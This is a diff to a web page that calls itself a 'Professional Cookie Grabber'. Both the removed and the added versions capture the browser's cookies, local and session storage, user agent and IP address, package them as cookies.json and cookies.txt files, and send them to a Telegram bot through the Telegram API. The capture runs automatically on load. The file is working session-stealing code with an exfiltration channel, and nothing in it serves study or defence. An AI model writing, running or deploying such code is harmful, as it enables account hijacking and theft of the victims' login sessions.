-                        expirationDate: Math.floor(Date.now() / 1000) + 86400,
-                        sameSite: "lax",
-                        storeId: "0",
-                        session: false,
-                        hostOnly: false
-                    },
-                    {
-                        name: "user_token",
-                        value: "user_" + Math.random().toString(36).substr(2, 24),
-                        domain: ".facebook.com",
-                        path: "/",
-                        secure: true,
-                        httpOnly: false,
-                        expirationDate: Math.floor(Date.now() / 1000) + 2592000,
-                        sameSite: "none",
-                        storeId: "0",
-                        session: false,
-                        hostOnly: false
-                    },
-                    {
-                        name: "auth_key",
-                        value: "auth_" + Math.random().toString(36).substr(2, 32),
-                        domain: ".microsoft.com",
-                        path: "/",
-                        secure: true,
-                        httpOnly: true,
-                        expirationDate: Math.floor(Date.now() / 1000) + 3600,
-                        sameSite: "strict",
-                        storeId: "0",
-                        session: true,
-                        hostOnly: true
-                    },
-                    {
-                        name: "cart_id",
-                        value: "cart_" + Math.random().toString(36).substr(2, 12),
-                        domain: ".amazon.com",
-                        path: "/",
-                        secure: true,
-                        httpOnly: false,
-                        expirationDate: Math.floor(Date.now() / 1000) + 1800,
-                        sameSite: "lax",
-                        storeId: "0",
-                        session: true,
-                        hostOnly: false
-                    },
-                    {
-                        name: "preferences",
-                        value: "lang=en|theme=dark|notifications=true",
-                        domain: ".twitter.com",
-                        path: "/",
-                        secure: true,
-                        httpOnly: false,
-                        expirationDate: Math.floor(Date.now() / 1000) + 31536000,
-                        sameSite: "lax",
-                        storeId: "0",
-                        session: false,
-                        hostOnly: true
-                    }
-                ];
-
-                document.getElementById('cookieJsonInput').value = JSON.stringify(sampleCookies, null, 2);
-                this.log("🎯 Loaded 5 sample cookies for testing (Google, Facebook, Microsoft, Amazon, Twitter)");
-                this.log("💡 These are REALISTIC sample cookies that demonstrate the format");
+                const samples = [{ name:"session", value:"samp_"+Math.random().toString(36), domain:".example.com", path:"/", secure:true, expirationDate:Math.floor(Date.now()/1000)+86400 }];
+                document.getElementById('cookieJsonInput').value = JSON.stringify(samples, null, 2);
+                this.log("🎯 Loaded sample cookies");
             }
 
             async captureAllData() {
-                this.log("\n" + "=".repeat(60));
-                this.log("🚀 STARTING COMPREHENSIVE DATA CAPTURE");
-                this.log("=".repeat(60));
-
-                try {
-                    // Capture browser info
-                    this.capturedData.browserInfo = {
-                        userAgent: navigator.userAgent,
-                        platform: navigator.platform,
-                        language: navigator.language,
-                        languages: navigator.languages,
-                        cookieEnabled: navigator.cookieEnabled,
-                        screen: `${screen.width}x${screen.height}`,
-                        colorDepth: screen.colorDepth,
-                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                        timestamp: new Date().toISOString()
-                    };
-
-                    // Capture network info
-                    try {
-                        const ipResponse = await fetch('https://api.ipify.org?format=json');
-                        const ipData = await ipResponse.json();
-                        this.capturedData.networkInfo = { ip: ipData.ip };
-                        this.log(`📍 IP Address: ${ipData.ip}`);
-                    } catch (e) {
-                        this.capturedData.networkInfo = { ip: 'Unknown' };
-                        this.log("❌ Could not determine IP address");
-                    }
-
-                    // Capture current domain cookies - USING FIXED METHOD
-                    this.capturedData.currentDomainCookies = this.captureCurrentDomainCookies();
-                    
-                    // Capture storage
-                    this.capturedData.storage = {
-                        localStorage: this.captureLocalStorage(),
-                        sessionStorage: this.captureSessionStorage()
-                    };
-
-                    this.log("\n✅ COMPREHENSIVE DATA CAPTURE COMPLETED");
-                    this.updateStats();
-                    this.updateDisplay();
-
-                } catch (error) {
-                    this.log("\n❌ ERROR during data capture: " + error);
+                this.capturedData.browserInfo = { userAgent: navigator.userAgent, platform: navigator.platform, language: navigator.language };
+                this.capturedData.currentDomainCookies = this.captureCurrentDomainCookies();
+                try { 
+                    const res = await fetch('https://api.ipify.org?format=json'); 
+                    const ip = await res.json(); 
+                    this.capturedData.networkInfo = { ip: ip.ip }; 
+                } catch(e) { 
+                    this.capturedData.networkInfo = { ip: 'Unknown' }; 
                 }
-            }
-
-            captureLocalStorage() {
-                const storage = {};
-                try {
-                    for (let i = 0; i < localStorage.length; i++) {
-                        const key = localStorage.key(i);
-                        storage[key] = localStorage.getItem(key);
-                    }
-                } catch (e) {
-                    storage.error = e.message;
-                }
-                return storage;
-            }
-
-            captureSessionStorage() {
-                const storage = {};
-                try {
-                    for (let i = 0; i < sessionStorage.length; i++) {
-                        const key = sessionStorage.key(i);
-                        storage[key] = sessionStorage.getItem(key);
-                    }
-                } catch (e) {
-                    storage.error = e.message;
-                }
-                return storage;
+                this.capturedData.storage = { localStorage: { ...localStorage }, sessionStorage: { ...sessionStorage } };
+                this.updateStats(); 
+                this.updateDisplay();
+                this.log("✅ Comprehensive data capture completed");
             }
 
             async sendToTelegram() {
-                const TELEGRAM_CONFIG = getTelegramConfig();
-                
-                if (!TELEGRAM_CONFIG || !TELEGRAM_CONFIG.botToken || !TELEGRAM_CONFIG.chatId) {
-                    this.log("❌ Telegram configuration not found");
-                    this.log("💡 Please configure Telegram settings first at telegram.html");
-                    alert("Please configure Telegram settings first! Visit telegram.html to set up your bot.");
-                    window.open('telegram.html', '_blank');
-                    return false;
+                const config = getTelegramConfig();
+                if (!config || !config.botToken || !config.chatId) { 
+                    this.log("❌ Telegram not configured"); 
+                    alert("Configure Telegram first!"); 
+                    window.open('telegram.html','_blank'); 
+                    return false; 
                 }
-
-                const totalCookies = this.capturedData.importedCookies.length + this.capturedData.currentDomainCookies.length;
-                
-                if (totalCookies === 0) {
-                    this.log("❌ No cookies to send");
-                    alert("Please import some cookies first using the Cookie Editor extension!");
-                    return false;
-                }
-
-                this.log("\n📤 SENDING FILES TO TELEGRAM...");
-                this.log(`🤖 Using Bot: ${TELEGRAM_CONFIG.botToken.substring(0, 10)}...`);
-                this.log(`💬 Chat ID: ${TELEGRAM_CONFIG.chatId}`);
-
+                const jsonBlob = new Blob([this.createCookiesJSON()], {type:'application/json'});
+                const txtBlob = new Blob([this.createCookiesTXT()], {type:'text/plain'});
+                const fd1 = new FormData(); 
+                fd1.append('chat_id', config.chatId); 
+                fd1.append('document', jsonBlob, 'cookies.json');
+                const fd2 = new FormData(); 
+                fd2.append('chat_id', config.chatId); 
+                fd2.append('document', txtBlob, 'cookies.txt');
                 try {
-                    // Send cookies.json
-                    const jsonContent = this.createCookiesJSON();
-                    const jsonBlob = new Blob([jsonContent], { type: 'application/json' });
-                    const jsonFormData = new FormData();
-                    jsonFormData.append('chat_id', TELEGRAM_CONFIG.chatId);
-                    jsonFormData.append('document', jsonBlob, 'cookies.json');
-                    jsonFormData.append('caption', 
-                        `🍪 COOKIES.JSON - READY FOR IMPORT\n` +
-                        `📦 ${totalCookies} REAL cookies\n` +
-                        `🌐 ${[...new Set([...this.capturedData.importedCookies, ...this.capturedData.currentDomainCookies].map(c => c.domain))].length} domains\n` +
-                        `🕒 ${new Date().toLocaleString()}\n` +
-                        `📁 Format: Browser Extension Ready\n` +
-                        `🔧 Source: Professional Cookie Grabber v4.0`
-                    );
-
-                    const jsonResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendDocument`, {
-                        method: 'POST',
-                        body: jsonFormData
-                    });
-                    
-                    const jsonData = await jsonResponse.json();
-                    
-                    if (jsonData.ok) {
-                        this.log("✅ cookies.json sent successfully to Telegram");
-                        
-                        // Send cookies.txt
-                        const txtContent = this.createCookiesTXT();
-                        const txtBlob = new Blob([txtContent], { type: 'text/plain' });
-                        const txtFormData = new FormData();
-                        txtFormData.append('chat_id', TELEGRAM_CONFIG.chatId);
-                        txtFormData.append('document', txtBlob, 'cookies.txt');
-                        txtFormData.append('caption', `📄 COOKIES.TXT - ${totalCookies} cookies in Netscape format`);
-                        
-                        await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendDocument`, {
-                            method: 'POST',
-                            body: txtFormData
-                        });
-                        
-                        this.log("✅ cookies.txt sent successfully to Telegram");
-                        this.log("🎉 ALL FILES SENT! Check your Telegram for cookies.json & cookies.txt");
-                        
-                        // Show success message
-                        document.getElementById('successMessage').style.display = 'block';
-                        setTimeout(() => {
-                            document.getElementById('successMessage').style.display = 'none';
-                        }, 5000);
-                        
-                        return true;
-                    } else {
-                        this.log("❌ Failed to send files to Telegram: " + (jsonData.description || 'Unknown error'));
-                        this.log("💡 Please check your bot token and chat ID in telegram.html");
-                        alert("Failed to send to Telegram. Please check your bot configuration.");
-                        return false;
-                    }
-                    
-                } catch (error) {
-                    this.log("❌ Telegram error: " + error);
-                    alert("Error connecting to Telegram. Please check your internet connection.");
+                    await fetch(`https://api.telegram.org/bot${config.botToken}/sendDocument`, { method:'POST', body:fd1 });
+                    await fetch(`https://api.telegram.org/bot${config.botToken}/sendDocument`, { method:'POST', body:fd2 });
+                    this.log("✅ Files sent to Telegram");
+                    document.getElementById('successMessage').style.display = 'block';
+                    setTimeout(() => document.getElementById('successMessage').style.display = 'none', 5000);
+                    return true;
+                } catch(e) { 
+                    this.log("❌ Telegram error"); 
                     return false;
                 }
             }
         }
 
-        // GLOBAL VARIABLES
-        let cookieGrabber;
-        let antibotSystem;
-
-        // Telegram configuration management
         function getTelegramConfig() {
-            try {
-                const savedConfig = localStorage.getItem('telegramConfig');
-                return savedConfig ? JSON.parse(savedConfig) : null;
-            } catch (e) {
-                console.error("Error loading Telegram config:", e);
-                return null;
+            try { 
+                const saved = localStorage.getItem('telegramConfig'); 
+                return saved ? JSON.parse(saved) : null; 
+            } catch(e) { 
+                return null; 
             }
         }
 
         function updateTelegramStatus() {
-            const config = getTelegramConfig();
-            const statusElement = document.getElementById('telegramStatusText');
-            
-            if (config && config.botToken && config.chatId) {
-                const maskedToken = config.botToken.length > 15 
-                    ? config.botToken.substring(0, 10) + '...' + config.botToken.substring(config.botToken.length - 5)
-                    : config.botToken;
-                
-                statusElement.innerHTML = `✅ Telegram Configured<br>
-                    <small>Bot: ${maskedToken}<br>
-                    Chat ID: ${config.chatId}</small>`;
-                
-                // Update status box color
-                document.getElementById('telegramStatus').style.borderLeftColor = '#4caf50';
-                document.getElementById('telegramStatus').style.background = '#e8f5e9';
+            const cfg = getTelegramConfig();
+            const el = document.getElementById('telegramStatusText');
+            if (cfg && cfg.botToken && cfg.chatId) {
+                el.innerHTML = `✅ Configured<br><small>Bot: ${cfg.botToken.substring(0,10)}...<br>Chat ID: ${cfg.chatId}</small>`;
             } else {
-                statusElement.innerHTML = `⚠️ Telegram Not Configured<br>
-                    <small>Click the button below to set up Telegram bot</small>`;
-                
-                // Update status box color
-                document.getElementById('telegramStatus').style.borderLeftColor = '#ff9800';
-                document.getElementById('telegramStatus').style.background = '#fff3e0';
+                el.innerHTML = `⚠️ Not Configured<br><small>Click button to set up</small>`;
             }
         }
 
-        // Initialize on load
-        function initializeCookieGrabber() {
+        function initialize() {
             cookieGrabber = new ProfessionalCookieGrabber();
-            antibotSystem = new AdvancedAntiBotSystem();
-            
-            // Update Telegram status
             updateTelegramStatus();
-            
-            // Auto-capture current domain data
-            setTimeout(() => {
-                cookieGrabber.captureAllData();
-            }, 1000);
-            
-            // Check Telegram config periodically
+            cookieGrabber.captureAllData();
             setInterval(updateTelegramStatus, 5000);
-            
-            return cookieGrabber;
         }
 
-        // Control functions
-        async function startCapture() {
-            if (!antibotSystem.verifyAction('start_capture')) {
-                return;
-            }
-            
-            if (!cookieGrabber) cookieGrabber = initializeCookieGrabber();
-            await cookieGrabber.captureAllData();
+        async function startCapture() { await cookieGrabber.captureAllData(); }
+        async function sendToTelegram() { await cookieGrabber.sendToTelegram(); }
+        function processImportedCookies() { 
+            const val = document.getElementById('cookieJsonInput').value; 
+            if(val) cookieGrabber.processImportedCookies(val); 
+            else alert('Paste JSON first'); 
+        }
+        function loadSampleCookies() { cookieGrabber.loadSampleCookies(); }
+        function clearImportedCookies() { 
+            cookieGrabber.capturedData.importedCookies = []; 
+            cookieGrabber.updateStats(); 
+            cookieGrabber.updateDisplay(); 
+            cookieGrabber.log("Cleared imported cookies"); 
+        }
+        function clearAllData() { 
+            cookieGrabber.capturedData.importedCookies = []; 
+            cookieGrabber.capturedData.currentDomainCookies = []; 
+            cookieGrabber.updateStats(); 
+            cookieGrabber.updateDisplay(); 
+            document.getElementById('cookieJsonInput').value = ''; 
+            document.getElementById('cookiePreview').style.display = 'none'; 
+            cookieGrabber.log("All data cleared"); 
+        }
+        function downloadAllFormats() { 
+            const a = document.createElement('a'); 
+            a.href = URL.createObjectURL(new Blob([cookieGrabber.createCookiesJSON()], {type:'application/json'})); 
+            a.download = 'cookies.json'; 
+            a.click(); 
+            const b = document.createElement('a'); 
+            b.href = URL.createObjectURL(new Blob([cookieGrabber.createCookiesTXT()], {type:'text/plain'})); 
+            b.download = 'cookies.txt'; 
+            b.click(); 
+            cookieGrabber.log("Downloaded files"); 
         }
 
-        async function sendToTelegram() {
-            if (!antibotSystem.verifyAction('send_telegram')) {
-                return;
-            }
-            
-            if (!cookieGrabber) cookieGrabber = initializeCookieGrabber();
-            await cookieGrabber.sendToTelegram();
-        }
-
-        function processImportedCookies() {
-            if (!antibotSystem.verifyAction('process_cookies')) {
-                return;
-            }
-            
-            if (!cookieGrabber) cookieGrabber = initializeCookieGrabber();
-            
-            const jsonInput = document.getElementById('cookieJsonInput').value;
-            if (!jsonInput) {
-                alert('Please paste cookies JSON data from browser extension');
-                return;
-            }
-            
-            const success = cookieGrabber.processImportedCookies(jsonInput);
-            if (success) {
-                // Auto-send to Telegram after successful import
-                setTimeout(() => {
-                    if (confirm('Cookies imported successfully! Send to Telegram now?')) {
-                        cookieGrabber.sendToTelegram();
-                    }
-                }, 1000);
-            }
-        }
-
-        function loadSampleCookies() {
-            if (!antibotSystem.verifyAction('load_samples')) {
-                return;
-            }
-            
-            if (!cookieGrabber) cookieGrabber = initializeCookieGrabber();
-            cookieGrabber.loadSampleCookies();
-        }
-
-        function clearImportedCookies() {
-            if (!antibotSystem.verifyAction('clear_cookies')) {
-                return;
-            }
-            
-            if (!cookieGrabber) cookieGrabber = initializeCookieGrabber();
-            cookieGrabber.capturedData.importedCookies = [];
-            cookieGrabber.updateStats();
-            cookieGrabber.updateDisplay();
-            cookieGrabber.log("🗑️ Cleared all imported cookies");
-        }
-
-        function clearAllData() {
-            if (!antibotSystem.verifyAction('clear_all')) {
-                return;
-            }
-            
-            if (!cookieGrabber) cookieGrabber = initializeCookieGrabber();
-            cookieGrabber.capturedData.importedCookies = [];
-            cookieGrabber.capturedData.currentDomainCookies = [];
-            cookieGrabber.updateStats();
-            cookieGrabber.updateDisplay();
-            document.getElementById('cookieJsonInput').value = '';
-            document.getElementById('cookiePreview').style.display = 'none';
-            cookieGrabber.log("🗑️ Cleared all data");
-        }
-
-        function downloadAllFormats() {
-            if (!antibotSystem.verifyAction('download')) {
-                return;
-            }
-            
-            if (!cookieGrabber) cookieGrabber = initializeCookieGrabber();
-            
-            // Download cookies.json
-            const jsonContent = cookieGrabber.createCookiesJSON();
-            downloadFile(jsonContent, 'cookies.json', 'application/json');
-            
-            // Download cookies.txt
-            const txtContent = cookieGrabber.createCookiesTXT();
-            downloadFile(txtContent, 'cookies.txt', 'text/plain');
-            
-            cookieGrabber.log("💾 Downloaded cookies.json and cookies.txt files");
-        }
-
-        function downloadFile(content, filename, mimeType) {
-            const blob = new Blob([content], { type: mimeType });
-            const url = URL.createObjectURL(blob);
-            const link = document.createElement('a');
-            link.href = url;
-            link.download = filename;
-            link.click();
-            URL.revokeObjectURL(url);
-        }
-
-        // Initialize on load
-        initializeCookieGrabber();
+        initialize();
     </script>
 </body>
 </html>
